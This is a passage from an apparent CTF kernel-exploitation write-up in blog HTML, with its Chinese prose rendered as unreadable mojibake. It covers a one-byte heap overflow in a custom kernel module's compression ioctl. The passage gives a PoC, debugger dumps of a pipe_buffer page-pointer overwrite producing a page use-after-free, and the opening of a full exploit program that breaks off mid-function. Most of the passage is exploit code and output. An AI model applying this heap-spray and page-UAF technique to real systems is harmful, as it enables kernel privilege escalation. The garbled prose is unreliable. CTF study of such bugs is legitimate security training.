class="number">16</span>);</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸‰ä¸ªå‚æ•° 16 æ˜¯ sizeï¼Œä¹Ÿå°±æ˜¯å‘Šè¯‰å†…æ ¸æˆ‘è¦å¯¹ 16 ä¸ª int å¯¹è±¡è¿›è¡Œå‹ç¼©ï¼Œä¹Ÿå°±æ˜¯è¯´å†…æ ¸ä¼šåœ¨å †ä¸Šç”³è¯· 4 * 16 &#x3D; 0x40 å¤§å°çš„å †ç©ºé—´ï¼Œæ­¤æ—¶å‹ç¼©åçš„æ•°æ®å¦‚ä¸‹ï¼š  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">8</span>gx <span class="number">0xffffa1bdc1319940</span></span><br><span class="line"><span class="number">0xffffa1bdc1319940</span>:     <span class="number">0x8080800108442291</span>      <span class="number">0x8080808080808080</span></span><br><span class="line"><span class="number">0xffffa1bdc1319950</span>:     <span class="number">0x0000000080808080</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xffffa1bdc1319960</span>:     <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xffffa1bdc1319970</span>:     <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å‹ç¼©åçš„æ•°æ®ä¸º 0x108442291 å’Œ 15 ä¸ª 0x80ï¼Œ0x80 çš„äºŒè¿›åˆ¶ä¸ºï¼š  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">bin</span>(<span class="number">0x80</span>)</span><br><span class="line"><span class="string">&#x27;0b10000000&#x27;</span></span><br></pre></td></tr></table></figure><p>åœ¨æˆ‘ä»¬çš„å‹ç¼©ç®—æ³•é‡Œé¢è¦å‡ºç°è¿™ç§ç°è±¡çš„åªæœ‰ä¸€ç§æƒ…å†µï¼Œé‚£å°±æ˜¯è¿™ä¸ª int å¯¹è±¡å…¨ä¸º 0ï¼Œè€Œæˆ‘ä»¬å‘Šè¯‰å†…æ ¸æˆ‘ä»¬è¦å‹ç¼© 15 ä¸ª int å¯¹è±¡ï¼Œæˆ‘ä»¬è¾“å…¥æ•°æ®é‡Œé¢æœ‰ 15 ä¸ª int ä¸º 0ï¼Œå’Œ 15 ä¸ª 0x80 ç›¸å»åˆã€‚  </p><p>è€Œ 0x108442291 åˆ™ä¸º 0x11111111 å‹ç¼©åçš„ç»“æœï¼Œå°†å…¶äºŒè¿›åˆ¶ä½è¿›è¡Œæ¯”è¾ƒç„¶ååœ¨çœ‹ä¸€éæˆ‘ä¸Šé¢å¯¹è¯¥å‹ç¼©ç®—æ³•çš„ç®€è¿°å°±å¾ˆå¥½ç†è§£ï¼š  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">bin</span>(<span class="number">0x11111111</span>)</span><br><span class="line"><span class="string">&#x27;0b10001000100010001000100010001&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">bin</span>(<span class="number">0x0108442291</span>)</span><br><span class="line"><span class="string">&#x27;0b100001000010001000010001010010001&#x27;</span></span><br></pre></td></tr></table></figure><p>çœ‹åˆ°è¿™é‡Œæ¼æ´å°±æ˜¾è€Œæ˜“è§äº†ï¼Œè¯¥å‹ç¼©ç®—æ³•ä¸»è¦æ˜¯å¯¹ 0 æ•°æ®è¿›è¡Œå‹ç¼©ï¼Œå¯æ˜¯å¦‚æœæˆ‘ä»¬ä¸€ä¸ª int ç±»å‹çš„æ•°æ®é•¿åº¦åˆšå¥½å æ»¡äº† 4 å­—èŠ‚å‘¢ï¼Ÿç”±äºæ¯ä¸€ç»„éƒ½ä¼šæœ‰ 1 bit çš„æ ‡å¿—ä½ï¼Œå› æ­¤è¿™é‡Œä¼šæº¢å‡ºä¸€å­—èŠ‚ã€‚ä¸Šé¢ 0x11111111 å‹ç¼©åçš„æ•°æ®å°±æ˜æ˜¾æ¯”å‹ç¼©å‰çš„æ•°æ®å¤§ã€‚ç”±äº int ä¸º 0 çš„æ—¶å‹ç¼©åçš„æ•°æ®ä¸º 0x80ï¼Œ0x40 å¯¹é½ï¼Œåˆšå¥½å¯ä»¥ç”¨äºè¦†ç›– pipe_buffer çš„ä½å­—èŠ‚æ¥å®ç° page uaf  </p><p>ä¸‹é¢è¿™æ®µ poc å¯ä»¥å®ç° 0x40 å¤§å°çš„ object æº¢å‡ºä¸€å­—èŠ‚ \x80  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">data[<span class="number">0</span>] = <span class="number">0x11111111</span>;</span><br><span class="line">data[<span class="number">1</span>] = <span class="number">0x22222222</span>;</span><br><span class="line">data[<span class="number">2</span>] = <span class="number">0x33333333</span>;</span><br><span class="line">data[<span class="number">3</span>] = <span class="number">0x44444444</span>;</span><br><span class="line">data[<span class="number">4</span>] = <span class="number">0x55555555</span>;</span><br><span class="line">data[<span class="number">5</span>] = <span class="number">0x66666666</span>;</span><br><span class="line">data[<span class="number">6</span>] = <span class="number">0x77777777</span>;</span><br><span class="line">data[<span class="number">7</span>] = <span class="number">0x88888888</span>;</span><br><span class="line">data[<span class="number">8</span>] = <span class="number">0x99999999</span>;</span><br><span class="line">data[<span class="number">9</span>] = <span class="number">0xaaaaaaaa</span>;</span><br><span class="line">data[<span class="number">10</span>] = <span class="number">0xbbbbbbbb</span>;</span><br><span class="line">data[<span class="number">11</span>] = <span class="number">0xcccccccc</span>;</span><br><span class="line">data[<span class="number">12</span>] = <span class="number">0xc0</span>;</span><br><span class="line"></span><br><span class="line">compress(<span class="number">0</span>,data,<span class="number">16</span>);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬ object ç”³è¯·ç”¨çš„æ˜¯ GFP_KERNELï¼Œè€Œ pipe_buffer ç”¨çš„æ˜¯ GFP_KERNEL_ACCOUNTï¼Œå­˜åœ¨éš”ç¦»ï¼Œå¯æ˜¯åœ¨è°ƒè¯•çš„è¿‡ç¨‹ä¸­æˆ‘ä»¬ä¼šå‘ç°æœ‰å¾ˆå¤§æ¦‚ç‡å­˜åœ¨ä¸€ä¸ª kmalloc-64 ä¸”ç±»å‹ä¸º GFP_KERNEL çš„ slab ä¸ä¸€ä¸ªç©ºé—²çš„ page ç›¸é‚»ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å †å–·å¤§é‡çš„ pipe_buffer å°è¯•å ç”¨é‚£ä¸€ä¸ª pageï¼Œç„¶åå†å †å–·å¤§é‡çš„æº¢å‡ºå‹ç¼© object å°è¯•è¦†ç›– pipe_buffer çš„ page æŒ‡é’ˆçš„ä½å­—èŠ‚ï¼Œæ„é€ å‡º page uafï¼Œæ•ˆæœå¦‚ä¸‹ï¼š  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tel 0xffff8e89013a1000-0x40</span><br><span class="line">00:0000â”‚  0xffff8e89013a0fc0 â—‚â€” 0x844a20108442291</span><br><span class="line">01:0008â”‚  0xffff8e89013a0fc8 â—‚â€” 0xc403194c66b30211</span><br><span class="line">02:0010â”‚  0xffff8e89013a0fd0 â—‚â€” 0x2a552ad504221108</span><br><span class="line">03:0018â”‚  0xffff8e89013a0fd8 â—‚â€” 0x6ef70633194ce605</span><br><span class="line">04:0020â”‚  0xffff8e89013a0fe0 â—‚â€” 0x7844221188073b5d</span><br><span class="line">05:0028â”‚  0xffff8e89013a0fe8 â—‚â€” 0x2a55aa794c663399</span><br><span class="line">06:0030â”‚  0xffff8e89013a0ff0 â—‚â€” 0xcc7b5d6e77bb7a55</span><br><span class="line">07:0038â”‚  0xffff8e89013a0ff8 â—‚â€” 0x808001c07c663319</span><br><span class="line">pwndbg&gt;</span><br><span class="line">08:0040â”‚  0xffff8e89013a1000 â€”â–¸ 0xffff8e89013a0780 â—‚â€” 0x844a20108442291  ----&gt; victim</span><br><span class="line">09:0048â”‚  0xffff8e89013a1008 â—‚â€” 0x3b /* <span class="string">&#x27;;&#x27;</span> */</span><br><span class="line">0a:0050â”‚  0xffff8e89013a1010 â—‚â€” 0x41 /* <span class="string">&#x27;A&#x27;</span> */</span><br><span class="line">0b:0058â”‚  0xffff8e89013a1018 â—‚â€” 0x0</span><br><span class="line">0c:0060â”‚  0xffff8e89013a1020 â€”â–¸ 0xffff8e89013a0740 â—‚â€” 0x844a20108442291</span><br><span class="line">0d:0068â”‚  0xffff8e89013a1028 â—‚â€” 0x3c /* <span class="string">&#x27;&lt;&#x27;</span> */</span><br><span class="line">0e:0070â”‚  0xffff8e89013a1030 â—‚â€” 0x41 /* <span class="string">&#x27;A&#x27;</span> */</span><br><span class="line">0f:0078â”‚  0xffff8e89013a1038 â—‚â€” 0x0</span><br><span class="line">pwndbg&gt;</span><br><span class="line">10:0080â”‚  0xffff8e89013a1040 â€”â–¸ 0xffff8e89013a0780 â—‚â€” 0x844a20108442291  ----&gt; victim</span><br><span class="line">11:0088â”‚  0xffff8e89013a1048 â—‚â€” 0x3d /* <span class="string">&#x27;=&#x27;</span> */</span><br><span class="line">12:0090â”‚  0xffff8e89013a1050 â—‚â€” 0x41 /* <span class="string">&#x27;A&#x27;</span> */</span><br><span class="line">13:0098â”‚  0xffff8e89013a1058 â—‚â€” 0x0</span><br><span class="line">14:00a0â”‚  0xffff8e89013a1060 â€”â–¸ 0xffff8e89013a07c0 â—‚â€” 0x844a20108442291</span><br><span class="line">15:00a8â”‚  0xffff8e89013a1068 â—‚â€” 0x3e /* <span class="string">&#x27;&gt;&#x27;</span> */</span><br><span class="line">16:00b0â”‚  0xffff8e89013a1070 â—‚â€” 0x41 /* <span class="string">&#x27;A&#x27;</span> */</span><br><span class="line">17:00b8â”‚  0xffff8e89013a1078 â—‚â€” 0x0</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// musl-gcc exp.c --static -masm=intel -lpthread -idirafter /usr/include/ -idirafter /usr/include/x86_64-linux-gnu/ -o exp</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/utsname.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/if_packet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;crypt.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">compress_array_arg</span>&#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> idx;</span><br><span class="line">    <span class="type">int</span> *<span class="built_in">array</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">decompress_array_arg</span>&#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> idx;</span><br><span class="line">    <span class="type">int</span> *<span class="built_in">array</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">del_array_arg</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">empty_array_arg</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_PIPE_COUNT 0x80</span></span><br><span class="line"><span class="type">int</span> pipe_fd[MAX_PIPE_COUNT][<span class="number">2</span>];</span><br><span class="line"><span class="type">int</span> already_read[MAX_PIPE_COUNT];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spray_pipes</span><span class="params">(<span class="type">int</span> start, <span class="type">int</span> cnt)</span> &#123;</span><br><span class="line">    <span class="type">char</span> *buf[<span class="number">0x1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] enter %s start from index: %d\n&quot;</span>, __PRETTY_FUNCTION__, start);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = start; i &lt; cnt; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;create pipe&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (fcntl(pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">1</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;resize pipe&quot;</span>);    </span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">info</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[+] %s\n\033[0m&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexx</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s: %#lx\n\033[0m&quot;</span>, msg, value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">binary_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33m[*] %s:\n\033[0m&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* bind the process to specific core */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span>&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pushf;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pop user_rflags;&quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">void</span> <span class="title function_">compress</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> idx, <span class="type">int</span> *<span class="built_in">array</span>, <span class="type">unsigned</span> <span class="type">long</span> size)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">compress_array_arg</span> <span class="title">arg_struct</span>;</span></span><br><span class="line">    arg_struct.idx = idx;</span><br><span class="line">    arg_struct.<span 